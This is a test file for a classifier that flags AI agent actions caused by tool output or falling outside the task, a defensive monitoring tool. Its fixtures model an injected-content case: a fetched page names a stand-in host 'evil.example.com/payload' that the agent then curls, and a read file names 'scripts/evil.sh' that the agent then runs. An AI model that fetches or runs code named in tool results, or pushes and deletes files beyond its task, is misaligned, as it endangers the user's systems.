"""Tests for src/unasked/classify.py — precision-first provenance classifier.

All fixtures built inline; no real ~/.claude reads, no real session data.
Covers the four F3b required axes:
  1. TRUE TOOL_INDUCED positive: result_entities → target match, not in task
  2. Anti-false-positive: read-then-edit helper.py must NOT be TOOL_INDUCED
  3. AUTONOMOUS / scope_drift
  4. REQUESTED (unflagged)
  5. scope_drift None when no task_text
  6. Feedback override
"""

from __future__ import annotations

import pytest

from unasked.classify import (
    classify_run,
    _bash_is_consequential,
    WRITE_TOOLS,
    CONSEQUENTIAL_BASH_VERBS,
    BENIGN_BASH_VERBS,
)
from unasked.ir import Decision, Run


# ── Helpers ───────────────────────────────────────────────────────────────────

def _run(task: str | None, decisions: list[Decision]) -> Run:
    return Run(run_id="test-run", source="test", task_text=task, decisions=decisions)


def _dec(
    step: int,
    tool: str,
    targets: list[str],
    result_entities: list[str] | None = None,
    is_error: bool = False,
    **kwargs,
) -> Decision:
    return Decision(
        step_index=step,
        ts=None,
        tool_name=tool,
        tool_args_summary="",
        targets=targets,
        result_entities=result_entities or [],
        is_error=is_error,
        **kwargs,
    )


# ── _bash_is_consequential ────────────────────────────────────────────────────

class TestBashIsConsequential:
    def test_git_push_is_consequential(self):
        assert _bash_is_consequential("git push origin main") is True

    def test_git_commit_is_consequential(self):
        assert _bash_is_consequential("git commit -m 'fix'") is True

    def test_git_status_is_benign(self):
        assert _bash_is_consequential("git status") is False

    def test_git_diff_is_benign(self):
        assert _bash_is_consequential("git diff HEAD") is False

    def test_git_log_is_benign(self):
        assert _bash_is_consequential("git log --oneline") is False

    def test_rm_is_consequential(self):
        assert _bash_is_consequential("rm -rf dist/") is True

    def test_curl_is_consequential(self):
        assert _bash_is_consequential("curl https://example.com/api") is True

    def test_pytest_is_benign(self):
        assert _bash_is_consequential("pytest tests/") is False

    def test_ls_is_benign(self):
        assert _bash_is_consequential("ls -la") is False

    def test_grep_is_benign(self):
        assert _bash_is_consequential("grep -r 'auth' src/") is False

    def test_npm_publish_is_consequential(self):
        assert _bash_is_consequential("npm publish") is True

    def test_npm_install_is_benign(self):
        assert _bash_is_consequential("npm install") is False

    def test_unknown_verb_conservative(self):
        # Unknown verb → conservative: True
        assert _bash_is_consequential("deploy_script.sh --env prod") is True

    def test_empty_command(self):
        assert _bash_is_consequential("") is False


# ── TOOL_INDUCED (F3b primary requirement) ────────────────────────────────────

class TestToolInduced:
    def test_true_positive_url_in_result_then_fetched(self):
        """TRUE POSITIVE: WebFetch result contains a URL; next Bash curls that URL.
        The URL is not in task_text. Must be TOOL_INDUCED.
        """
        run = _run(
            "summarise the auth docs",
            [
                _dec(0, "WebFetch", ["https://docs.auth.com"],
                     result_entities=["https://evil.example.com/payload"]),
                _dec(1, "Bash", ["curl", "https://evil.example.com/payload"]),
            ],
        )
        d = classify_run(run).decisions[1]
        assert d.provenance == "TOOL_INDUCED", (
            f"Expected TOOL_INDUCED, got {d.provenance}. "
            "An action targeting a URL from a prior result must be flagged."
        )

    def test_true_positive_path_in_result_then_written(self):
        """TRUE POSITIVE: Read result contains a path; agent writes that path (not in task)."""
        run = _run(
            "fix auth bug",
            [
                _dec(0, "Read", ["docs/runbook.md"],
                     result_entities=["scripts/deploy.sh"]),
                _dec(1, "Write", ["scripts/deploy.sh"]),
            ],
        )
        d = classify_run(run).decisions[1]
        assert d.provenance == "TOOL_INDUCED"

    def test_non_adjacent_prior_still_detected(self):
        """Entity injected two steps back still triggers TOOL_INDUCED."""
        run = _run(
            "fix auth bug",
            [
                _dec(0, "Read", ["docs/runbook.md"],
                     result_entities=["scripts/evil.sh"]),
                _dec(1, "Bash", ["pytest", "tests/"]),  # unrelated step
                _dec(2, "Bash", ["bash", "scripts/evil.sh"]),
            ],
        )
        d = classify_run(run).decisions[2]
        assert d.provenance == "TOOL_INDUCED"

    def test_entity_in_task_not_tool_induced(self):
        """Entity in prior result_entities BUT also in task → NOT TOOL_INDUCED (REQUESTED)."""
        run = _run(
            "fix auth.py token bug",
            [
                _dec(0, "Read", ["auth.py"],
                     result_entities=["auth.py"]),
                _dec(1, "Edit", ["auth.py"]),
            ],
        )
        d = classify_run(run).decisions[1]
        assert d.provenance != "TOOL_INDUCED"
        assert d.provenance == "REQUESTED"

    def test_empty_result_entities_cannot_trigger(self):
        """No result_entities on prior step → TOOL_INDUCED cannot fire."""
        run = _run(
            "fix auth bug",
            [
                _dec(0, "Read", ["docs/runbook.md"], result_entities=[]),
                _dec(1, "Write", ["scripts/deploy.sh"]),
            ],
        )
        d = classify_run(run).decisions[1]
        assert d.provenance != "TOOL_INDUCED"

    def test_tool_induced_has_why(self):
        """TOOL_INDUCED decision carries a non-empty why string."""
        run = _run(
            "fix auth bug",
            [
                _dec(0, "WebFetch", ["https://docs.example.com"],
                     result_entities=["scripts/deploy.sh"]),
                _dec(1, "Write", ["scripts/deploy.sh"]),
            ],
        )
        d = classify_run(run).decisions[1]
        assert d.why and len(d.why) > 0


# ── Anti-false-positive: read-then-edit (F3b regression test) ────────────────

class TestReadThenEditAntiFalsePositive:
    def test_read_helper_then_edit_helper_not_tool_induced(self):
        """F3b REGRESSION TEST: Read src/helper.py (result = ordinary code,
        no external URLs/paths), then Edit src/helper.py.

        The old token-overlap proxy falsely flagged this as TOOL_INDUCED because
        'helper.py' appeared in both the Read call args and Edit call args.

        The new rule only fires when the Edit's TARGET appeared in the Read's
        RESULT CONTENT. Ordinary code content contains no external paths that
        the Edit targets — result_entities has no 'src/helper.py'.

        helper.py is off-task ('fix auth bug') so the edit lands AUTONOMOUS
        (consequential, off-task file). That is correct: the flag is scope/
        autonomous, not injection.
        """
        run = _run(
            "fix auth bug",
            [
                # result_entities = code tokens from helper.py, NOT the file path
                _dec(0, "Read", ["src/helper.py"],
                     result_entities=["def helper_func", "return result"]),
                _dec(1, "Edit", ["src/helper.py"]),
            ],
        )
        result = classify_run(run)
        d = result.decisions[1]

        assert d.provenance != "TOOL_INDUCED", (
            "Read-then-edit of the same file must NEVER be TOOL_INDUCED. "
            "This is the F3b regression the fix was designed to prevent. "
            f"Got: {d.provenance} (why: {d.why})"
        )
        # Should be AUTONOMOUS (off-task edit of a file not in 'fix auth bug')
        assert d.provenance == "AUTONOMOUS", (
            f"Expected AUTONOMOUS for off-task edit, got {d.provenance}"
        )

    def test_read_task_file_then_edit_not_tool_induced(self):
        """Read auth.py (in task), ordinary code result → Edit auth.py: REQUESTED."""
        run = _run(
            "fix auth.py token expiry",
            [
                _dec(0, "Read", ["auth.py"],
                     result_entities=["def validate_token", "return True"]),
                _dec(1, "Edit", ["auth.py"]),
            ],
        )
        d = classify_run(run).decisions[1]
        assert d.provenance != "TOOL_INDUCED"
        assert d.provenance == "REQUESTED"

    def test_grep_result_contains_file_then_read_is_not_flagged(self):
        """Bash grep (benign, non-external) → result mentions auth.py.
        Next Read of auth.py (in task) → REQUESTED, not TOOL_INDUCED.
        """
        run = _run(
            "fix auth.py bug",
            [
                _dec(0, "Bash", ["grep", "-r", "auth", "src/"],
                     result_entities=["src/auth.py"]),
                _dec(1, "Read", ["src/auth.py"]),
            ],
        )
        d = classify_run(run).decisions[1]
        # auth.py is in task → REQUESTED takes priority over TOOL_INDUCED
        assert d.provenance != "TOOL_INDUCED"


# ── REQUESTED (unflagged, routine) ────────────────────────────────────────────

class TestRequested:
    def test_edit_task_file(self):
        """Task names auth.py; Edit auth.py → REQUESTED."""
        run = _run(
            "fix auth.py token expiry",
            [_dec(0, "Edit", ["auth.py"])],
        )
        d = classify_run(run).decisions[0]
        assert d.provenance == "REQUESTED"

    def test_read_task_file(self):
        """Read is non-consequential; target in task → REQUESTED."""
        run = _run(
            "fix auth.py",
            [_dec(0, "Read", ["auth.py"])],
        )
        d = classify_run(run).decisions[0]
        assert d.provenance == "REQUESTED"

    def test_pytest_when_asked_not_autonomous(self):
        """pytest tests/ when task says 'run tests' → NOT AUTONOMOUS."""
        run = _run(
            "run tests for auth",
            [_dec(0, "Bash", ["pytest", "tests/"])],
        )
        d = classify_run(run).decisions[0]
        assert d.provenance != "AUTONOMOUS", (
            "Running tests when asked to run tests must not be AUTONOMOUS."
        )

    def test_requested_no_scope_drift(self):
        """Requested edit on task-named file → scope_drift False."""
        run = _run(
            "fix auth.py",
            [_dec(0, "Edit", ["auth.py"])],
        )
        d = classify_run(run).decisions[0]
        assert d.scope_drift is False


# ── AUTONOMOUS + scope_drift ──────────────────────────────────────────────────

class TestAutonomous:
    def test_git_push_not_in_task(self):
        """git push not in task 'fix auth bug' → AUTONOMOUS."""
        run = _run(
            "fix auth bug",
            [_dec(0, "Bash", ["git", "push", "origin", "main"])],
        )
        d = classify_run(run).decisions[0]
        assert d.provenance == "AUTONOMOUS"

    def test_edit_unrelated_file(self):
        """Edit config/db.yaml when task is about auth.py → AUTONOMOUS + scope_drift."""
        run = _run(
            "fix auth.py token expiry",
            [_dec(0, "Edit", ["config/db.yaml"])],
        )
        d = classify_run(run).decisions[0]
        assert d.provenance == "AUTONOMOUS"
        assert d.scope_drift is True

    def test_autonomous_errored_not_flagged(self):
        """An errored consequential action is NOT flagged AUTONOMOUS (less alarming)."""
        run = _run(
            "fix auth bug",
            [_dec(0, "Bash", ["git", "push", "origin", "main"], is_error=True)],
        )
        d = classify_run(run).decisions[0]
        assert d.provenance != "AUTONOMOUS"

    def test_read_not_autonomous(self):
        """Read is non-consequential — off-task reads must NOT be AUTONOMOUS."""
        run = _run(
            "fix auth.py",
            [_dec(0, "Read", ["src/unrelated.py"])],
        )
        d = classify_run(run).decisions[0]
        assert d.provenance != "AUTONOMOUS", (
            "Non-consequential reads must never be AUTONOMOUS — anti-cry-wolf."
        )

    def test_autonomous_has_why(self):
        run = _run(
            "fix auth bug",
            [_dec(0, "Bash", ["git", "push", "origin", "main"])],
        )
        d = classify_run(run).decisions[0]
        assert d.why and len(d.why) > 0


# ── scope_drift ───────────────────────────────────────────────────────────────

class TestScopeDrift:
    def test_none_when_no_task_text(self):
        """scope_drift must be None when task_text is absent."""
        run = _run(
            None,
            [
                _dec(0, "Edit", ["auth.py"]),
                _dec(1, "Edit", ["config/db.yaml"]),
                _dec(2, "Bash", ["git", "push"]),
            ],
        )
        result = classify_run(run)
        for d in result.decisions:
            assert d.scope_drift is None, (
                f"step {d.step_index}: scope_drift should be None without task_text, "
                f"got {d.scope_drift}"
            )

    def test_false_for_non_consequential(self):
        """Read is not consequential → scope_drift False even if off-task."""
        run = _run(
            "fix auth.py",
            [_dec(0, "Read", ["config/db.yaml"])],
        )
        d = classify_run(run).decisions[0]
        assert d.scope_drift is False

    def test_true_for_consequential_off_task_path(self):
        """Edit to a top-level dir not in task_entities → scope_drift True."""
        run = _run(
            "fix auth.py token expiry",
            [_dec(0, "Edit", ["config/db.yaml"])],
        )
        d = classify_run(run).decisions[0]
        assert d.scope_drift is True

    def test_false_when_target_in_task(self):
        """Edit auth.py when task is about auth.py → scope_drift False."""
        run = _run(
            "fix auth.py",
            [_dec(0, "Edit", ["auth.py"])],
        )
        d = classify_run(run).decisions[0]
        assert d.scope_drift is False


# ── Feedback override ─────────────────────────────────────────────────────────

class TestFeedbackOverride:
    def test_feedback_skips_classification(self):
        """Decision with feedback set must not be reclassified."""
        dec = _dec(0, "Bash", ["git", "push", "origin", "main"],
                   feedback="approved-push")
        run = _run("fix auth bug", [dec])
        result = classify_run(run)
        d = result.decisions[0]
        assert d.provenance is None   # not set by classifier
        assert d.feedback == "approved-push"

    def test_only_feedback_decision_skipped(self):
        """Only feedback-annotated decision skipped; others classified normally."""
        run = _run(
            "fix auth bug",
            [
                _dec(0, "Read", ["auth.py"], feedback="ok"),
                _dec(1, "Bash", ["git", "push", "origin", "main"]),
            ],
        )
        result = classify_run(run)
        assert result.decisions[0].provenance is None   # skipped
        assert result.decisions[1].provenance == "AUTONOMOUS"  # classified


# ── DERIVED (default, unflagged) ──────────────────────────────────────────────

class TestDerived:
    def test_no_task_text_defaults_derived(self):
        """Without task_text, non-consequential first step → DERIVED."""
        run = _run(None, [_dec(0, "Read", ["auth.py"])])
        d = classify_run(run).decisions[0]
        assert d.provenance == "DERIVED"

    def test_glob_is_not_autonomous(self):
        """Glob is non-consequential and exploratory → not AUTONOMOUS."""
        run = _run(
            "fix auth bug",
            [_dec(0, "Glob", ["src/**/*.py"])],
        )
        d = classify_run(run).decisions[0]
        assert d.provenance != "AUTONOMOUS"

    def test_classify_run_mutates_in_place(self):
        """classify_run mutates decisions in-place and returns the SAME Run object."""
        run = _run("fix auth.py", [_dec(0, "Read", ["auth.py"])])
        result = classify_run(run)
        assert result is run
        assert run.decisions[0].provenance is not None
